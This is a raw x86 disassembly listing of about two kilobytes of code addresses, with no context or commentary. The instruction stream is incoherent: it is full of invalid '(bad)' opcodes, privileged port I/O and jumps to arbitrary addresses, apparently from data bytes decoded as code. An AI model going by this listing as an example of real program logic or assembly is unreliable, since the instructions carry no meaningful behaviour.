  411629:	fisubr WORD PTR [ebp+0x1e53b441]
  41162f:	push   ecx
  411630:	sar    dl,cl
  411632:	in     al,0x2
  411634:	dec    ebp
  411635:	call   FWORD PTR [eax+0x15]
  411638:	mov    ecx,0xcc3ad4e4
  41163d:	cwde   
  41163e:	and    eax,0x2790c184
  411643:	nop
  411644:	enter  0xe1f3,0xc9
  411648:	jb     0x4116b4
  41164a:	test   eax,0x434e71ee
  41164f:	test   eax,0x1a791894
  411654:	sahf   
  411655:	sbb    DWORD PTR [edx],esi
  411657:	mov    ds:0x82ee0353,al
  41165c:	rcr    BYTE PTR [bx+si],1
  41165f:	sti    
  411660:	stos   BYTE PTR es:[edi],al
  411661:	adc    eax,0x71c8a278
  411666:	mov    eax,0x6ee0755
  41166b:	xor    al,0x1a
  41166d:	shl    bl,0x81
  411670:	fldenv [ebp+0x4272d495]
  411676:	and    ebp,edi
  411678:	data16 fiadd DWORD PTR [ecx+0x1a308bb]
  41167f:	in     eax,0xa9
  411681:	sbb    BYTE PTR [ebx],ah
  411683:	les    ebp,FWORD PTR [edi-0x3e]
  411686:	and    edx,DWORD PTR [esi+eax*2]
  411689:	pop    edx
  41168a:	jle    0x411611
  41168c:	retf   
  41168d:	scas   eax,DWORD PTR es:[edi]
  41168e:	mov    ds:0xa8846df8,eax
  411693:	or     DWORD PTR [eax],esi
  411695:	or     ebp,eax
  411697:	mov    eax,0x2ce02095
  41169c:	pop    ecx
  41169d:	outs   dx,BYTE PTR ds:[esi]
  41169e:	bound  ebp,QWORD PTR [esi+esi*1]
  4116a1:	or     cl,BYTE PTR [eax+0x63]
  4116a4:	inc    edx
  4116a5:	fwait
  4116a6:	cwde   
  4116a7:	jns    0x4116a2
  4116a9:	out    dx,al
  4116aa:	sub    al,0x16
  4116ac:	dec    ecx
  4116ad:	push   0xd593bd60
  4116b2:	icebp  
  4116b3:	xor    BYTE PTR [esi],al
  4116b5:	push   eax
  4116b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b7:	or     eax,edx
  4116b9:	mov    ecx,0xec9615e4
  4116be:	inc    eax
  4116bf:	in     eax,0xad
  4116c1:	idiv   ah
  4116c3:	nop
  4116c4:	inc    edx
  4116c5:	push   esi
  4116c6:	or     eax,0x506da893
  4116cb:	add    BYTE PTR [edx],ah
  4116cd:	push   ebx
  4116ce:	retf   
  4116cf:	aam    0x5d
  4116d1:	inc    ebx
  4116d2:	add    ah,al
  4116d4:	push   ds
  4116d5:	std    
  4116d6:	test   al,0x9e
  4116d8:	ins    BYTE PTR es:[edi],dx
  4116d9:	push   edi
  4116da:	mov    dh,0xcc
  4116dc:	inc    esi
  4116dd:	xor    dh,BYTE PTR [ebx+0x5018efc3]
  4116e3:	jl     0x4116b8
  4116e5:	mov    ch,0xb2
  4116e7:	jecxz  0x41175d
  4116e9:	add    eax,0x7c1cc4e7
  4116ee:	iret   
  4116ef:	or     DWORD PTR [esi+0x14],eax
  4116f2:	mov    eax,0xa7b15aaf
  4116f7:	sub    ebp,DWORD PTR [edi]
  4116f9:	int3   
  4116fa:	fist   DWORD PTR [bp+0x1280]
  4116ff:	inc    ebx
  411700:	aam    0x39
  411702:	mov    dl,0xf9
  411704:	xchg   edx,eax
  411705:	jnp    0x4116fd
  411707:	or     eax,0xe3d2eed
  41170c:	stos   DWORD PTR es:[edi],eax
  41170d:	fwait
  41170e:	xor    eax,0xdd3d04f0
  411713:	pop    edi
  411714:	mov    ds,WORD PTR [ecx-0x1f24a187]
  41171a:	fild   QWORD PTR [ebp-0x21a6332d]
  411720:	outs   dx,BYTE PTR ds:[esi]
  411721:	neg    DWORD PTR [edx+ebx*1-0x3ae7da07]
  411728:	or     BYTE PTR [ebp+0x3b],dl
  41172b:	xchg   BYTE PTR [esp+ebx*8+0x93c1423],bl
  411732:	fmul   DWORD PTR [esi-0x14954cb2]
  411738:	adc    edx,ecx
  41173a:	std    
  41173b:	stc    
  41173c:	adc    eax,0x425d501f
  411741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411742:	push   esp
  411743:	push   cs
  411744:	pop    ss
  411745:	fcmovnbe st,st(0)
  411747:	cmp    DWORD PTR [ecx-0x77f3aa0a],0xad63bbf3
  411751:	fs cmp al,0x3a
  411754:	std    
  411755:	mov    dh,0x48
  411757:	ja     0x41176e
  411759:	fcomp  DWORD PTR [ebp+0x5c]
  41175c:	adc    esp,DWORD PTR [ebx+0xf319ce8]
  411762:	mov    bh,0xd5
  411764:	icebp  
  411765:	gs pop ebp
  411767:	mov    cl,0xcc
  411769:	pop    ss
  41176a:	aad    0x94
  41176c:	pop    edx
  41176d:	test   BYTE PTR [edi+0x7f],dh
  411770:	leave  
  411771:	add    esp,DWORD PTR [eax+0x1a]
  411774:	cmp    BYTE PTR [edx+0x696f37ee],bh
  41177a:	xchg   esi,eax
  41177b:	(bad)  
  41177c:	and    ah,dl
  41177e:	stc    
  41177f:	sti    
  411780:	xchg   ch,bl
  411782:	xchg   DWORD PTR [ebx],eax
  411784:	cmp    eax,0xc74961ad
  411789:	cmp    esp,DWORD PTR [ebp-0x2494198d]
  41178f:	jecxz  0x4117cb
  411791:	aas    
  411792:	(bad)  
  411793:	jno    0x4117bc
  411795:	cmp    ch,BYTE PTR ds:[eax-0x436bb2a4]
  41179c:	cmp    al,0xc0
  41179e:	sub    eax,edx
  4117a0:	stc    
  4117a1:	dec    esp
  4117a2:	mov    esp,0xd42308f8
  4117a7:	cmc    
  4117a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117a9:	pop    ebp
  4117aa:	jb     0x411742
  4117ac:	(bad)  
  4117ae:	pop    es
  4117af:	out    0xc2,al
  4117b1:	adc    BYTE PTR [eax],bl
  4117b3:	gs xor ch,dh
  4117b6:	out    0x3e,al
  4117b8:	es addr16 cdq 
  4117bb:	test   DWORD PTR [esi-0x31],esp
  4117be:	popa   
  4117bf:	xor    eax,0x6e883629
  4117c4:	call   0x2c160a36
  4117c9:	sbb    bh,BYTE PTR [ecx-0x1f]
  4117cc:	jle    0x411766
  4117ce:	outs   dx,DWORD PTR ds:[esi]
  4117cf:	sub    esp,ebx
  4117d1:	(bad)  
  4117d2:	into   
  4117d3:	jmp    0x84e6a2b9
  4117d8:	imul   esi,DWORD PTR [eax+ebx*2],0x50
  4117dc:	aas    
  4117dd:	sahf   
  4117de:	call   FWORD PTR [ebp-0x5a]
  4117e1:	stos   BYTE PTR es:[edi],al
  4117e2:	dec    edx
  4117e3:	adc    DWORD PTR [edi],ebx
  4117e5:	mov    WORD PTR [ecx-0x2efc3a3a],cs
  4117eb:	mov    ebp,0xb9dfea45
  4117f0:	retf   0x8fea
  4117f3:	sub    al,0xfc
  4117f5:	xlat   BYTE PTR ds:[ebx]
  4117f6:	int    0x30
  4117f8:	jecxz  0x4117d8
  4117fa:	adc    edx,DWORD PTR [edi-0x4a]
  4117fd:	lock dec ebx
  4117ff:	(bad)  
  411801:	push   eax
  411802:	and    bl,BYTE PTR [ecx]
  411804:	or     DWORD PTR [edi],ebp
  411806:	jno    0x411875
  411808:	jno    0x4117fa
  41180a:	dec    esi
  41180b:	pop    edi
  41180c:	mov    ebx,0xdfb8f480
  411811:	sbb    ch,bh
  411813:	mov    ds,WORD PTR [ecx]
  411815:	xor    al,0x4d
  411817:	push   DWORD PTR [edx-0x43]
  41181a:	stos   BYTE PTR es:[edi],al
  41181b:	push   0xffffff84
  41181d:	stos   DWORD PTR es:[edi],eax
  41181e:	xchg   ebx,eax
  41181f:	inc    esi
  411820:	pop    ss
  411821:	(bad)  
  411823:	rcr    BYTE PTR [ebp-0x6b],1
  411826:	and    eax,DWORD PTR [eax+0x7d]
  411829:	and    BYTE PTR [esi],dh
  41182b:	jecxz  0x411856
  41182d:	iret   
  41182e:	in     al,0x32
  411830:	adc    bh,BYTE PTR [edi]
  411832:	rcr    DWORD PTR [edx+ebx*8+0x2ca0bef3],0x62
  41183a:	inc    esp
  41183b:	loope  0x4117eb
  41183d:	(bad)  
  41183f:	mov    esp,0xb1729b8a
  411844:	je     0x411846
  411846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411847:	push   ss
  411848:	or     ecx,eax
  41184a:	xor    eax,0x1ecfcc46
  41184f:	push   ebp
  411850:	outs   dx,DWORD PTR ds:[esi]
  411851:	sbb    eax,edi
  411853:	cmp    BYTE PTR [esp+ebx*8],dl
  411856:	sub    al,0x8
  411858:	inc    ebp
  411859:	ficom  DWORD PTR [ecx+esi*8]
  41185c:	lods   eax,DWORD PTR ds:[esi]
  41185d:	xor    al,0x8f
  41185f:	stc    
  411860:	dec    esp
  411861:	lock fs lahf 
  411864:	in     eax,dx
  411865:	adc    dl,cl
  411867:	push   0xffffffbc
  411869:	aad    0xd5
  41186b:	xchg   ebx,eax
  41186c:	into   
  41186d:	shl    BYTE PTR [edx],cl
  41186f:	in     eax,dx
  411870:	icebp  
  411871:	rcr    BYTE PTR [ebx-0x50857f9a],1
  411877:	mov    BYTE PTR [ecx-0x62],al
  41187a:	sub    eax,0x7dae2642
  41187f:	push   esp
  411880:	sub    dh,BYTE PTR [ebx-0x79]
  411883:	aaa    
  411884:	adc    DWORD PTR [edx+0x6c19a899],esi
  41188a:	push   ebx
  41188b:	xlat   BYTE PTR ds:[ebx]
  41188c:	inc    ebp
  41188d:	divps  xmm3,XMMWORD PTR [edi+0x29]
  411891:	iret   
  411892:	pop    ebx
  411893:	jae    0x4118d6
  411895:	or     eax,DWORD PTR [ebx+eax*4+0x1b36b2fb]
  41189c:	bound  esp,QWORD PTR [ebp+0x4e]
  41189f:	out    dx,eax
  4118a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118a1:	sub    dl,bl
  4118a3:	sbb    eax,0x8fb2da6c
  4118a8:	xor    al,0xc1
  4118aa:	out    dx,al
  4118ab:	fst    DWORD PTR [edi+ecx*2-0x26]
  4118af:	ret    
  4118b0:	xchg   edx,eax
  4118b1:	test   eax,0xaa6c3ff1
  4118b6:	stos   BYTE PTR es:[edi],al
  4118b7:	sahf   
  4118b8:	mov    ah,BYTE PTR [eax]
  4118ba:	dec    edi
  4118bb:	push   edi
  4118bc:	ret    0x374f
  4118bf:	and    eax,0xba38770c
  4118c4:	xchg   ecx,eax
  4118c5:	fbstp  TBYTE PTR [edi+0x32]
  4118c8:	mov    edi,0xc27203a3
  4118cd:	xchg   edi,eax
  4118ce:	hlt    
  4118cf:	(bad)  
  4118d0:	mov    al,ds:0x873feecd
  4118d5:	daa    
  4118d6:	or     al,0xb5
  4118d8:	outs   dx,DWORD PTR ds:[esi]
  4118d9:	je     0x411923
  4118db:	test   eax,ecx
  4118dd:	xchg   edx,eax
  4118de:	mov    ch,0xe7
  4118e0:	popf   
  4118e1:	xchg   ebx,eax
  4118e2:	mov    bl,BYTE PTR [ebx-0x3f]
  4118e5:	repz dec ebx
  4118e7:	cs mov ecx,0x10162c26
  4118ed:	inc    esp
  4118ee:	jns    0x41187e
  4118f0:	inc    ecx
  4118f1:	inc    edi
  4118f2:	outs   dx,DWORD PTR ds:[esi]
  4118f3:	enter  0xa4a3,0xb
  4118f7:	add    eax,0xc3328ee4
  4118fc:	lods   eax,DWORD PTR ds:[esi]
  4118fd:	sub    DWORD PTR [edx],edx
  4118ff:	loope  0x4118e4
  411901:	add    bh,BYTE PTR [esp+edx*4+0x709701c2]
  411908:	data16 clc 
  41190a:	lds    ebx,FWORD PTR [ecx+0x54b7e52f]
  411910:	adc    cl,BYTE PTR [eax+0x75]
  411913:	fld    QWORD PTR [esi]
  411915:	xlat   BYTE PTR ds:[ebx]
  411916:	les    edi,FWORD PTR [esi-0x4e984805]
  41191c:	sahf   
  41191d:	cmp    ebx,ecx
  41191f:	push   ds
  411920:	mov    eax,0xb406af71
  411925:	dec    ecx
  411926:	lock mov al,0xad
  411929:	xor    edx,edx
  41192b:	daa    
  41192c:	or     DWORD PTR [edx-0x7e27eeef],edi
  411932:	(bad)  
  411933:	lods   eax,DWORD PTR gs:[esi]
  411935:	xor    eax,ecx
  411937:	(bad)  
  411938:	pop    edi
  411939:	aam    0xb7
  41193b:	mov    cl,0xc5
  41193d:	mov    ds:0x6954d0fb,al
  411942:	dec    esi
  411943:	jmp    0x41199e
  411945:	js     0x4119c5
  411947:	adc    ax,0x5308
  41194b:	icebp  
  41194c:	push   ecx
  41194d:	xor    eax,DWORD PTR [ecx]
  41194f:	jge    0x41199e
  411951:	dec    ebp
  411952:	shr    DWORD PTR [ecx+0x4ef97e4b],1
  411958:	shl    BYTE PTR [ebx-0x22],1
  41195b:	gs adc al,0x92
  41195e:	xor    al,0xbe
  411960:	push   ebx
  411961:	imul   BYTE PTR [eax+0x5228af0e]
  411967:	sbb    al,0x17
  411969:	jg     0x41198b
  41196b:	push   cs
  41196c:	in     al,0xa2
  41196e:	lods   eax,DWORD PTR ds:[esi]
  41196f:	fisttp WORD PTR [eax+0x1b0ff591]
  411975:	mov    ebx,0x1433ff3d
  41197a:	adc    al,0x20
  41197c:	adc    DWORD PTR [ecx+edx*4-0x9],ebp
  411980:	mov    bh,0xc7
  411982:	inc    edi
  411983:	ss repnz pop esi
  411986:	and    al,0x8a
  411988:	(bad)  
  411989:	sub    eax,0x788ff5a0
  41198e:	xor    edi,edx
  411990:	push   ss
  411991:	pop    esi
  411992:	clc    
  411993:	rcl    BYTE PTR [ebx+0x706de1df],1
  411999:	mov    cl,0xaf
  41199b:	or     DWORD PTR [edi+0x2d7c3ac8],edi
  4119a1:	pop    edi
  4119a2:	jle    0x41194a
  4119a4:	gs arpl ax,ax
  4119a7:	jle    0x4119b7
  4119a9:	ja     0x41193c
  4119ab:	pop    ecx
  4119ac:	cmp    bh,BYTE PTR [edx+0xf33bd86]
  4119b2:	xor    ecx,ebp
  4119b4:	ficom  WORD PTR [esi+0x43]
  4119b7:	arpl   WORD PTR [ebp+0x1d9ce805],dx
  4119bd:	xlat   BYTE PTR ds:[ebx]
  4119be:	int    0xda
  4119c0:	aam    0x49
  4119c2:	das    
  4119c3:	jnp    0x4119cb
  4119c5:	hlt    
  4119c6:	lods   al,BYTE PTR ds:[esi]
  4119c7:	push   esp
  4119c8:	pop    esi
  4119c9:	mov    dh,0xa7
  4119cb:	dec    ebx
  4119cc:	mov    cl,0xb8
  4119ce:	loope  0x4119eb
  4119d0:	add    BYTE PTR [ebx],0x6a
  4119d3:	out    dx,al
  4119d4:	int3   
  4119d5:	xchg   ecx,eax
  4119d6:	(bad)  
  4119d7:	fwait
  4119d8:	dec    esi
  4119d9:	pop    es
  4119da:	ret    0x6a37
  4119dd:	loopne 0x411a0a
  4119df:	outs   dx,DWORD PTR ds:[esi]
  4119e0:	cdq    
  4119e1:	das    
  4119e2:	test   esi,ebp
  4119e4:	clc    
  4119e5:	xchg   DWORD PTR [ebx-0x73e7f30],esi
  4119eb:	sahf   
  4119ec:	mov    bl,0xdf
  4119ee:	lock sub ebx,DWORD PTR [edx+0x4b]
  4119f2:	pop    ebx
  4119f3:	inc    eax
  4119f4:	mov    DWORD PTR [esi-0x18],edi
  4119f7:	(bad)  
  4119f8:	js     0x411a54
  4119fa:	mov    esp,0x1595ee80
  4119ff:	xchg   ecx,eax
  411a00:	sub    BYTE PTR [eax+esi*8+0x55],dh
  411a04:	inc    BYTE PTR [edi-0x7a]
  411a07:	in     al,dx
  411a08:	daa    
  411a09:	sbb    dl,BYTE PTR [ebx+0x444089d3]
  411a0f:	mov    edi,0x5a66f81
  411a14:	or     al,0x83
  411a16:	ds jg  0x4119ef
  411a19:	jo     0x411a76
  411a1b:	jnp    0x4119b9
  411a1d:	in     eax,dx
  411a1e:	and    DWORD PTR [eax],edx
  411a20:	dec    edi
  411a21:	test   DWORD PTR [eax],0xb90e759
  411a27:	mov    eax,0x22ad2830
  411a2c:	fidiv  WORD PTR [edx+0x12448259]
  411a32:	in     eax,dx
  411a33:	xor    ecx,DWORD PTR [esp+edx*8]
  411a36:	nop
  411a37:	sbb    eax,0xd5bee4e7
  411a3c:	sbb    DWORD PTR [esp+ecx*8+0x18452acd],eax
  411a43:	jbe    0x411a0c
  411a45:	mov    al,0x9b
  411a47:	retf   0x67dc
  411a4a:	loop   0x411a72
  411a4c:	xchg   ah,dl
  411a4e:	dec    edx
  411a4f:	ins    DWORD PTR es:[edi],dx
  411a50:	fsubr  DWORD PTR [esi+0x2a80cc08]
  411a56:	in     eax,dx
  411a57:	jne    0x411a17
  411a59:	add    al,0x7c
  411a5b:	lods   eax,DWORD PTR ds:[esi]
  411a5c:	dec    ebx
  411a5d:	lea    esp,[ecx-0x1060fb39]
  411a63:	cmp    eax,0x76d5e43c
  411a68:	fwait
  411a69:	std    
  411a6a:	fsubr  QWORD PTR [edi-0x516bb4cc]
  411a70:	aad    0xf3
  411a72:	inc    ebx
  411a73:	ins    DWORD PTR es:[edi],dx
  411a74:	jmp    0x9b75:0x26490b15
  411a7b:	enter  0x74d3,0x6b
  411a7f:	ds sahf 
  411a81:	rcl    BYTE PTR [edi+0x37],cl
  411a84:	fnstenv [ebx-0x7b]
  411a87:	mov    DWORD PTR [esi+0x55],ebx
  411a8a:	inc    ecx
  411a8b:	dec    edi
  411a8c:	jecxz  0x411a97
  411a8e:	in     al,0x17
  411a90:	pop    esp
  411a91:	or     esp,DWORD PTR [esi-0xc]
  411a94:	mov    ds:0xc25f3d89,al
  411a99:	test   al,0x25
  411a9b:	mov    ds:0x94f6672e,eax
  411aa0:	in     eax,dx
  411aa1:	bound  ebx,QWORD PTR [edx]
  411aa3:	into   
  411aa4:	push   es
  411aa5:	push   cs
  411aa6:	fst    DWORD PTR [esi]
  411aa8:	bound  esp,QWORD PTR [ebx+0x45c43434]
  411aae:	sub    al,0xee
  411ab0:	enter  0x46f0,0x59
  411ab4:	push   es
  411ab5:	jb     0x411aaf
  411ab7:	push   cs
  411ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab9:	mov    bl,0xab
  411abb:	jbe    0x411ad5
  411abd:	cmp    DWORD PTR [edi+0x77],esi
  411ac0:	jle    0x411b34
  411ac2:	jb     0x411b25
  411ac4:	lods   eax,DWORD PTR ds:[esi]
  411ac5:	xor    dl,ch
  411ac7:	sub    DWORD PTR [ebp-0x2c84d512],esi
  411acd:	int3   
  411ace:	sub    esp,ebp
  411ad0:	mov    ebx,0xff9dae6b
  411ad5:	mov    bl,0xfb
  411ad7:	xor    cl,BYTE PTR [edx+0x11]
  411ada:	mov    DWORD PTR [ebp+0x4a],eax
  411add:	stos   BYTE PTR es:[edi],al
  411ade:	pop    ds
  411adf:	test   eax,0x431c64a3
  411ae4:	je     0x411a68
  411ae6:	xor    BYTE PTR [ebx-0x1e],al
  411ae9:	mov    WORD PTR [edx-0x1ea7283d],ss
  411aef:	rcr    DWORD PTR [esi],0xc3
  411af2:	fucomi st,st(4)
  411af4:	arpl   bx,bp
  411af6:	lahf   
  411af7:	sbb    dh,BYTE PTR [ecx-0x4841f3ef]
  411afd:	jp     0x411b4b
  411aff:	cmp    BYTE PTR [ebp+0x7b],0x3
  411b03:	push   es
  411b04:	xor    DWORD PTR [ebx+edx*1+0x6e],edi
  411b08:	adc    ah,BYTE PTR [ebx+eiz*4]
  411b0b:	sub    dh,BYTE PTR [eax]
  411b0d:	mov    DWORD PTR [ecx+0x35d31ed6],ebp
  411b13:	dec    bp
  411b15:	mov    ebx,0xf7568134
  411b1a:	jne    0x411b97
  411b1c:	shl    DWORD PTR [edi-0x5a],1
  411b1f:	fwait
  411b20:	sti    
  411b21:	jmp    0x411b77
  411b23:	aam    0x35
  411b25:	add    bh,BYTE PTR [ebx+0x1000a287]
  411b2b:	push   ebx
  411b2c:	fs xchg ecx,eax
  411b2e:	jbe    0x411b53
  411b30:	retf   0x6af5
  411b33:	ficomp DWORD PTR [edi]
  411b35:	mov    dh,0x31
  411b37:	fwait
  411b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b39:	xchg   edx,eax
  411b3a:	fwait
  411b3b:	das    
  411b3c:	xor    edx,DWORD PTR [edi+ebx*8-0x2f522e50]
  411b43:	ret    
  411b44:	fidivr DWORD PTR [ebp+0x18]
  411b47:	pop    ds
  411b48:	inc    edi
  411b49:	sub    al,0xbd
  411b4b:	outs   dx,BYTE PTR ds:[esi]
  411b4c:	xor    al,0xc9
  411b4e:	shl    edx,cl
  411b50:	stos   BYTE PTR es:[edi],al
  411b51:	das    
  411b52:	and    eax,0xd51e1674
  411b57:	mov    edx,0xd3f0251f
  411b5c:	add    BYTE PTR [eax-0x24c9efa1],ch
  411b62:	sbb    BYTE PTR [ebx+0x2a],dl
  411b65:	outs   dx,DWORD PTR ds:[esi]
  411b66:	loopne 0x411b41
  411b68:	xor    dh,BYTE PTR [edi-0x47]
  411b6b:	mov    eax,ds:0x7660b5bb
  411b70:	jge    0x411afe
  411b72:	nop
  411b73:	cmp    edx,DWORD PTR [edi-0x52]
  411b76:	lea    eax,[esi-0x33]
  411b79:	fisub  WORD PTR [edx+0x3ba84ba8]
  411b7f:	mov    ds:0x97d522c6,eax
  411b84:	out    dx,al
  411b85:	nop
  411b86:	jl     0x411b1a
  411b88:	push   ds
  411b89:	jge    0x411bab
  411b8b:	mul    DWORD PTR [eax+0x6d]
  411b8e:	sahf   
  411b8f:	in     al,dx
  411b90:	outs   dx,DWORD PTR ds:[esi]
  411b91:	jmp    0x411bab
  411b93:	fs pop eax
  411b95:	pop    esp
  411b96:	push   esp
  411b97:	gs gs sbb esi,0x1c2119a2
  411b9f:	jns    0x411b84
  411ba1:	cwde   
  411ba2:	adc    DWORD PTR [esi-0x1e],eax
  411ba5:	inc    ecx
  411ba6:	sub    esi,ebx
  411ba8:	push   edx
  411ba9:	aad    0xb8
  411bab:	dec    esp
  411bac:	xchg   edi,eax
  411bad:	mov    ds:0xcc57c13,al
  411bb2:	(bad)  
  411bb3:	jecxz  0x411baf
  411bb5:	sub    DWORD PTR [edx-0x50],edx
  411bb8:	add    esp,edx
  411bba:	and    al,0x27
  411bbc:	fld    DWORD PTR [ebx+0xa9807d]
  411bc2:	jge    0x411ba4
  411bc4:	push   es
  411bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc6:	loopne 0x411c28
  411bc8:	xchg   edx,eax
  411bc9:	pusha  
  411bca:	int    0xfe
  411bcc:	sub    ebp,esi
  411bce:	lea    ebx,[edi]
  411bd0:	sub    eax,0x5f8fce90
  411bd5:	push   edi
  411bd6:	(bad)  
  411bd7:	call   0x68b7e94a
  411bdc:	test   eax,0xed5474df
  411be1:	ret    
  411be2:	lahf   
  411be3:	pop    ds
  411be4:	ss mov bl,0xc8
  411be7:	inc    esp
  411be8:	cmc    
  411be9:	pop    edi
  411bea:	cs hlt 
  411bec:	enter  0x3680,0x65
  411bf0:	lds    edx,FWORD PTR [ecx]
  411bf2:	jae    0x411c47
  411bf4:	adc    DWORD PTR [ecx-0x6],ebx
  411bf7:	inc    ebp
  411bf8:	fs xor eax,0x7068eeb3
  411bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bff:	outs   dx,DWORD PTR ds:[esi]
  411c00:	in     al,0xee
  411c02:	sub    eax,0x253035e8
  411c07:	fdiv   st(2),st
  411c09:	loop   0x411c3a
  411c0b:	lods   al,BYTE PTR ds:[esi]
  411c0c:	xor    DWORD PTR [edx+0x50],esp
  411c0f:	mov    bh,al
  411c11:	pop    ebp
  411c12:	and    esi,esp
  411c14:	data16 stos BYTE PTR es:[edi],al
  411c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c17:	pop    esp
  411c18:	shl    DWORD PTR [edx],cl
  411c1a:	xchg   ecx,eax
  411c1b:	hlt    
  411c1c:	test   BYTE PTR [edx+ebp*2],bl
  411c1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c20:	div    BYTE PTR [edi+edx*8]
  411c23:	es push es
  411c25:	jo     0x411c79
  411c27:	xchg   esi,eax
  411c28:	sbb    ch,BYTE PTR [esi+eax*1-0x56d76f62]
  411c2f:	sar    BYTE PTR [eax-0x57],1
  411c32:	jo     0x411c48
  411c34:	cs (bad) 
  411c36:	pop    esi
  411c37:	retf   
  411c38:	mov    cl,0x8f
  411c3a:	push   esp
  411c3b:	test   BYTE PTR [edx],ah
  411c3d:	adc    ebp,0x25
  411c40:	imul   ebx,DWORD PTR [ecx],0x7ecfe6de
  411c46:	add    WORD PTR [eax],bp
  411c49:	cmp    eax,0x7c9f7db5
  411c4e:	scas   al,BYTE PTR es:[edi]
  411c4f:	push   es
  411c50:	in     eax,0x20
  411c52:	(bad)  
  411c53:	ins    BYTE PTR es:[edi],dx
  411c54:	jnp    0x411c2a
  411c56:	ins    DWORD PTR es:[edi],dx
  411c57:	xchg   esi,eax
  411c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c59:	(bad)  
  411c5b:	mov    ebp,0xaf2252e6
  411c60:	ins    BYTE PTR es:[edi],dx
  411c61:	inc    BYTE PTR ds:0xc664d54a
  411c67:	mov    ds,WORD PTR [eax]
  411c69:	jl     0x411c87
  411c6b:	js     0x411cc9
  411c6d:	xor    al,BYTE PTR [edx+eiz*8]
  411c70:	ficom  WORD PTR [eax]
  411c72:	mov    cl,BYTE PTR [edx-0x2a05d622]
  411c78:	shl    DWORD PTR [eax],cl
  411c7a:	pop    ebx
  411c7b:	sub    al,0x33
  411c7d:	(bad)  
  411c7e:	fnstenv [ebx]
  411c80:	sbb    al,0x37
  411c82:	jmp    0xe279:0x4a3513bb
  411c89:	imul   esp,edx,0x12
  411c8c:	sbb    eax,0x6ebf74b8
  411c91:	adc    al,0xa4
  411c93:	cmp    eax,0xcdf4c1
	...
  411d14:	sub    DWORD PTR [edx+0x41],ebx
  411d17:	sbb    dh,BYTE PTR [ebx+0x1b]
  411d1a:	jnp    0x411d97
  411d1c:	retf   0x5bc8
  411d1f:	nop
  411d20:	ins    BYTE PTR es:[edi],dx
  411d21:	lods   al,BYTE PTR ds:[esi]
  411d22:	add    edi,DWORD PTR [eax+ebx*4+0x6b0000c6]
  411d29:	pop    es
  411d2a:	add    BYTE PTR [eax],al
  411d2c:	and    ch,cl
  411d2e:	int3   
  411d2f:	mov    esi,0x5998fa83
  411d34:	push   ebx
  411d35:	fidiv  WORD PTR [eax+0x61]
  411d38:	aaa    
  411d39:	(bad)  
  411d3b:	or     esp,DWORD PTR [eax+0x777fdb36]
  411d41:	pop    ebp
  411d42:	ins    DWORD PTR es:[edi],dx
  411d43:	sahf   
  411d44:	and    eax,0x894ab981
  411d49:	jne    0x411dbf
  411d4b:	pop    DWORD PTR ds:0x3f2a7020
  411d52:	adc    esi,edx
  411d54:	call   0xd1e5:0xae633dc9
  411d5b:	cmp    DWORD PTR [ebx],edx
  411d5d:	cmp    eax,0x8195a69f
  411d62:	mov    ebx,0xfca92f83
  411d67:	jb     0x411da2
  411d69:	pop    eax
  411d6a:	add    eax,0x3d02c9b8
  411d6f:	daa    
  411d70:	retf   
  411d71:	jge    0x411d60
  411d73:	push   esp
  411d74:	in     eax,dx
  411d75:	pop    ebx
  411d76:	xor    DWORD PTR [ebx],0x45
  411d79:	fcomp  QWORD PTR [esi+0x7799764d]
  411d7f:	or     BYTE PTR [edx-0x63603fb5],dl
  411d85:	sbb    ebp,esi
  411d87:	enter  0xded1,0xe7
  411d8b:	and    DWORD PTR [ecx],esp
  411d8d:	fimul  DWORD PTR [edi]
  411d8f:	mov    bl,0x1
  411d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d92:	sbb    DWORD PTR [edx-0x52aa092d],edi
  411d98:	sub    al,0x31
  411d9a:	or     ch,BYTE PTR [edx-0x45]
  411d9d:	arpl   WORD PTR [ebx+0x11],di
  411da0:	push   ebp
  411da1:	push   ebx
  411da2:	sub    dh,cl
  411da4:	ss mov edi,0xa1422d0f
  411daa:	das    
  411dab:	mov    eax,0x113a2acf
  411db0:	inc    esi
  411db1:	repz xchg edx,eax
  411db3:	inc    edx
  411db4:	sar    BYTE PTR [edi-0x5920293c],cl
  411dba:	jno    0x411e16
  411dbc:	lock lea edi,[eax+edi*8-0x31]
  411dc1:	cld    
  411dc2:	dec    ecx
  411dc3:	es mov ch,0xf0
  411dc6:	mov    esp,0x9bc3de74
  411dcb:	(bad)  
  411dcc:	adc    BYTE PTR [ebx],ah
  411dce:	nop
  411dcf:	cmp    DWORD PTR [ebx+0x7161cecc],ebp
  411dd5:	push   ds
  411dd6:	xor    esp,DWORD PTR [ebx-0x55]
  411dd9:	aam    0x6e
  411ddb:	mov    eax,ds:0xf4f9e594
  411de0:	mov    ah,BYTE PTR [edi]
  411de2:	fwait
  411de3:	xor    eax,DWORD PTR [esi+0x690f9f7e]
  411de9:	outs   dx,DWORD PTR ds:[esi]
  411dea:	cs jne 0x411e67
  411ded:	mov    esp,esi
  411def:	jge    0x411dc8
  411df1:	jl     0x411e66
  411df3:	call   0xeaa7:0xc0c300b0
  411dfa:	push   esp
  411dfb:	sub    BYTE PTR [ecx+0x7a7bd638],al
  411e01:	mov    dh,0x34
  411e03:	dec    edi
  411e04:	sub    al,0xc7
  411e06:	push   esi
  411e07:	les    ebp,FWORD PTR [ebp-0x17]
  411e0a:	jg     0x411e38
  411e0c:	rol    BYTE PTR [ecx],1
  411e0e:	jmp    0x6314df9
  411e13:	mov    DWORD PTR [eax-0x19],eax
  411e16:	lods   eax,DWORD PTR ds:[esi]
  411e17:	loope  0x411e8e
  411e19:	call   0xa974e8b1
  411e1e:	sub    eax,0x2973edf0
  411e23:	and    cl,BYTE PTR [eax-0x59e1e721]
  411e29:	inc    bp
  411e2b:	jmp    0x3590153c
